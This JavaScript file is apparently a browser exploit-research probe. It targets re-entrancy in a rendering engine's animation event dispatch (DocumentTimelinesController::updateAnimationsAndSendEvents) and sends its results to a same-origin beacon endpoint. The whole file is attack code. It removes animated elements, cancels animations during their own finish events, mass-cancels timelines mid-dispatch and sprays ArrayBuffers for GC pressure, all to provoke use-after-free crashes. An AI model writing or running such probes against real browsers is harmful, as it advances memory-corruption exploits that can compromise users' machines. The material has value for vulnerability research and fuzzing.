// p516 — CSS Animation event re-entrancy during update tick
//
// DocumentTimelinesController::updateAnimationsAndSendEvents() dispatches
// animation events SYNCHRONOUSLY at line 196. Post-dispatch code at lines
// 199-213 processes animationsToRemove and completedTransitions lists that
// were built before events fired. During event handlers, JS can cancel
// animations, remove elements, and start new animations.
//
// Attack vectors:
// T1: Feature detect CSS animations/transitions support
// T2: In transitionend handler, remove the animated element → check if
//     completedTransitions processing crashes
// T3: In animationend handler, cancel() the animation and start a new
//     one on the same element → check for stale animation reference
// T4: In transitionend handler, modify another animation's timeline
//     → check for stale timeline reference in the iteration
// T5: Mass animation start/cancel in event handler → GC pressure
//
// Beacon prefix: V516-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V516-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // T1: Feature detection
  var features = {
    Animation: typeof Animation !== 'undefined',
    animate: !!(document.createElement('div').animate),
    CSSAnimation: typeof CSSAnimation !== 'undefined',
    CSSTransition: typeof CSSTransition !== 'undefined',
    getAnimations: typeof document.getAnimations === 'function',
    WeakRef: typeof WeakRef !== 'undefined',
    FinalizationRegistry: typeof FinalizationRegistry !== 'undefined'
  };
  B('T1-FEATURES', JSON.stringify(features));

  if (!features.animate) {
    B('T1-DEAD', 'Element.animate() not available');
    return;
  }

  var testArea = document.createElement('div');
  testArea.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;overflow:hidden';
  document.body.appendChild(testArea);

  var results = {};

  // T2: Remove animated element during transitionend
  try {
    B('T2-START', 'remove element in transitionend');
    var el2 = document.createElement('div');
    el2.style.cssText = 'width:100px;height:100px;background:red;transition:opacity 0.05s';
    testArea.appendChild(el2);

    // Force layout
    el2.offsetHeight;

    var t2done = false;
    el2.addEventListener('transitionend', function(e) {
      if (t2done) return;
      t2done = true;
      B('T2-HANDLER', 'transitionend fired, removing element');
      // Remove the element during the event handler
      // This happens DURING the dispatchEvent loop in updateAnimationsAndSendEvents
      try {
        el2.parentNode.removeChild(el2);
        B('T2-REMOVED', 'element removed during handler');

        // Force GC to try to free the element's animation state
        var gc = [];
        for (var i = 0; i < 5000; i++) gc.push(new ArrayBuffer(256));
        gc = null;
        B('T2-GC', 'GC pressure applied');
      } catch(e) {
        B('T2-ERR', e.name + ': ' + e.message);
      }
    });

    // Trigger transition
    el2.style.opacity = '0';

    setTimeout(function() {
      results.T2 = { done: t2done };
      B('T2-DONE', JSON.stringify(results.T2));
    }, 500);
  } catch(e) {
    B('T2-ERR', '' + e);
  }

  // T3: Cancel animation and start new one in animationend handler
  setTimeout(function() {
    try {
      B('T3-START', 'cancel+restart in animationend');
      var el3 = document.createElement('div');
      el3.style.cssText = 'width:50px;height:50px;background:blue';
      testArea.appendChild(el3);

      var anim3 = el3.animate([
        { transform: 'translateX(0)' },
        { transform: 'translateX(100px)' }
      ], { duration: 50, fill: 'forwards' });

      var t3log = [];

      anim3.onfinish = function() {
        t3log.push('finish-enter');
        try {
          // Cancel this animation during its own finish event
          anim3.cancel();
          t3log.push('cancelled');

          // Start a new animation on the same element immediately
          var anim3b = el3.animate([
            { opacity: 1 },
            { opacity: 0 }
          ], { duration: 50, fill: 'forwards' });

          anim3b.onfinish = function() {
            t3log.push('anim3b-finish');
          };

          t3log.push('new-anim-started');

          // Also try to start an animation on a REMOVED element
          var phantom = document.createElement('div');
          testArea.appendChild(phantom);
          var phantomAnim = phantom.animate([
            { width: '0px' }, { width: '100px' }
          ], { duration: 30 });
          phantom.remove();
          t3log.push('phantom-anim-on-removed');

        } catch(e) {
          t3log.push('err:' + e.message);
        }
      };

      setTimeout(function() {
        results.T3 = { log: t3log };
        B('T3-DONE', JSON.stringify(results.T3));
      }, 500);
    } catch(e) {
      B('T3-ERR', '' + e);
    }
  }, 700);

  // T4: Modify timeline during event dispatch — cancel multiple animations
  setTimeout(function() {
    try {
      B('T4-START', 'mass cancel during event dispatch');
      var els = [];
      var anims = [];
      var t4log = [];

      // Create 20 animations that all finish at roughly the same time
      for (var i = 0; i < 20; i++) {
        var el = document.createElement('div');
        el.style.cssText = 'width:10px;height:10px;background:green';
        testArea.appendChild(el);
        els.push(el);

        var a = el.animate([
          { transform: 'scale(1)' },
          { transform: 'scale(2)' }
        ], { duration: 50, fill: 'forwards' });
        anims.push(a);
      }

      // The first animation's finish handler cancels ALL other animations
      // This modifies the timeline during the event dispatch loop
      anims[0].onfinish = function() {
        t4log.push('first-finish');
        for (var j = 1; j < anims.length; j++) {
          try {
            anims[j].cancel();
            t4log.push('cancelled-' + j);
          } catch(e) {
            t4log.push('cancel-err-' + j + ':' + e.message);
          }
        }
        // Also remove all elements
        for (var k = 0; k < els.length; k++) {
          try { els[k].remove(); } catch(e) {}
        }
        t4log.push('all-removed');
      };

      // Each animation's finish handler checks if it's still valid
      for (var i = 1; i < 20; i++) {
        (function(idx) {
          anims[idx].onfinish = function() {
            t4log.push('finish-' + idx + ':playState=' + anims[idx].playState);
          };
        })(i);
      }

      setTimeout(function() {
        results.T4 = { log: t4log.slice(0, 40) };
        B('T4-DONE', JSON.stringify(results.T4));
      }, 800);
    } catch(e) {
      B('T4-ERR', '' + e);
    }
  }, 1400);

  // T5: WeakRef/FinalizationRegistry feature test + GC timing
  setTimeout(function() {
    try {
      B('T5-START', 'WeakRef + FinalizationRegistry');
      if (!features.WeakRef || !features.FinalizationRegistry) {
        results.T5 = { dead: true, reason: 'missing features' };
        B('T5-DEAD', JSON.stringify(results.T5));
        return;
      }

      var t5log = [];
      var collected = false;

      var registry = new FinalizationRegistry(function(held) {
        collected = true;
        t5log.push('collected:' + held);
        B('T5-COLLECTED', 'GC callback fired, held=' + held);
      });

      // Create object, register it, then make it unreachable
      var target = { data: new ArrayBuffer(1024), id: 'victim' };
      var weakRef = new WeakRef(target);
      registry.register(target, 'victim-token');

      // Drop the strong reference
      target = null;

      // Apply GC pressure
      var garbage = [];
      for (var g = 0; g < 20000; g++) {
        garbage.push(new ArrayBuffer(512));
      }
      garbage = null;

      // Check after delays
      var checkCount = 0;
      function checkCollection() {
        checkCount++;
        var deref = weakRef.deref();
        t5log.push('check-' + checkCount + ':deref=' + (deref ? 'alive' : 'collected'));

        if (checkCount < 5 && !collected) {
          // More GC pressure
          var more = [];
          for (var m = 0; m < 10000; m++) more.push(new ArrayBuffer(256));
          more = null;
          setTimeout(checkCollection, 200);
        } else {
          results.T5 = {
            weakRefWorks: true,
            finalizationCalled: collected,
            log: t5log
          };
          B('T5-DONE', JSON.stringify(results.T5));
        }
      }

      setTimeout(checkCollection, 100);
    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 2500);

  // Final summary
  setTimeout(function() {
    B('SUMMARY', JSON.stringify(results).slice(0, 800));
    B('COMPLETE', 'all tests done');
  }, 5000);

})();
